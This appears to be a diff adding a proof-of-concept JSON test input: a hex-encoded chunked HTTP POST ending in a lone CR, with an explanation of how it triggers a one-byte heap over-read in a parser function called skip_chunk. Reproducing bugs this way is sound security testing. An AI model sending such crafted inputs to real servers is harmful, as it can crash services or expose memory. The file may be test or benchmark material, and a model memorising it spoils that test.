@@ -1,0 +1,5 @@
+{
+  "hex_bytes": "50 4F 53 54 20 2F 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 61 0D 0A 54 72 61 6E 73 66 65 72 2D 45 6E 63 6F 64 69 6E 67 3A 20 63 68 75 6E 6B 65 64 0D 0A 0D 0A 32 0D 0A 61 62 0D",
+  "explanation": "Request-Line: \"POST / HTTP/1.1\\r\\n\". Headers: \"Host: a\\r\\n\" and \"Transfer-Encoding: chunked\\r\\n\", then header terminator \"\\r\\n\". Chunked body starts with a valid size line \"2\\r\\n\" (hex size 2), followed by exactly two data bytes \"ab\" and only a trailing CR \"\\r\" without the final LF. At this point the chunk parser (skip_chunk) positions i at that CR, with len == i + 1. Due to the buggy guard (len < i + 1 || buf[i] != '\\r' || buf[i + 1] != '\\n'), the length check passes and the code reads buf[i + 1] one byte past the buffer while checking for the LF.",
+  "expected_effect": "A one-byte heap buffer over-read at buf[i+1] inside skip_chunk() while validating the end-of-chunk CRLF (AddressSanitizer should report an out-of-bounds read)."
+}
